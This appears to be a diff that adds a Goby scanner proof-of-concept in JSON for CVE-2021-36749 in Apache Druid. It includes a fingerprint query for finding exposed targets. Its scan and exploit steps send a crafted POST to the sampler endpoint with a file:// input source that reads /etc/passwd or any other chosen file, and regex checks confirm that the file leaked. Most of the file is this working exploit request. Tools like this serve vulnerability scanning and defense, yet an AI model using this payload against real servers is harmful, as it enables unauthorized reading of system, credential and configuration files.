@@ -1,0 +1,109 @@
+{
+      "Name": "Apache Druid Arbitrary File Read (CVE-2021-36749)",
+      "Level": "1",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "title=\"Apache Druid\"",
+      "Description": "Because the user specified the HTTP InputSource without restriction, you can bypass the application level restriction by passing the file URL to the HTTP InputSource.  ",
+      "Product": "Apache Druid",
+      "Homepage": "https://druid.apache.org/",
+      "Author": "luckying1314@139.com",
+      "Impact": "<p><span>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</span><br></p>",
+      "Recommendation": "<p><span>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</span><span><a href>https://druid.apache.org/</a></span><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.<br>    3. If not necessary, prohibit public network access to the system.</p>",
+      "References": [
+            "https://github.com/BrucessKING/CVE-2021-36749"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Filepath",
+                  "Type": "createSelect",
+                  "Value": "/etc/passwd,/etc/hosts"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/druid/indexer/v1/sampler?for=connect",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/json;charset=UTF-8"
+                        },
+                        "data_type": "text",
+                        "data": "{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"inputSource\":{\"type\":\"http\",\"uris\":[\"file:///etc/passwd\"]},\"inputFormat\":{\"type\":\"regex\",\"pattern\":\"(.*)\",\"listDelimiter\":\"56616469-6de2-9da4-efb8-8f416e6e6965\",\"columns\":[\"raw\"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"timestampSpec\":{\"column\":\"!!!_no_such_column_!!!\",\"missingValue\":\"1970-01-01T00:00:00Z\"},\"dimensionsSpec\":{}},\"tuningConfig\":{\"type\":\"index\"}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "regex",
+                                    "value": "root:[x*]?:0:0:",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/druid/indexer/v1/sampler?for=connect",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/json;charset=UTF-8"
+                        },
+                        "data_type": "text",
+                        "data": "{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"inputSource\":{\"type\":\"http\",\"uris\":[\"file://{{{Filepath}}}\"]},\"inputFormat\":{\"type\":\"regex\",\"pattern\":\"(.*)\",\"listDelimiter\":\"56616469-6de2-9da4-efb8-8f416e6e6965\",\"columns\":[\"raw\"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"timestampSpec\":{\"column\":\"!!!_no_such_column_!!!\",\"missingValue\":\"1970-01-01T00:00:00Z\"},\"dimensionsSpec\":{}},\"tuningConfig\":{\"type\":\"index\"}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "regex",
+                                    "value": "root:[x*]?:0:0:",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-01 11:17:17",
+      "GobyVersion": "1.9.304"
+}
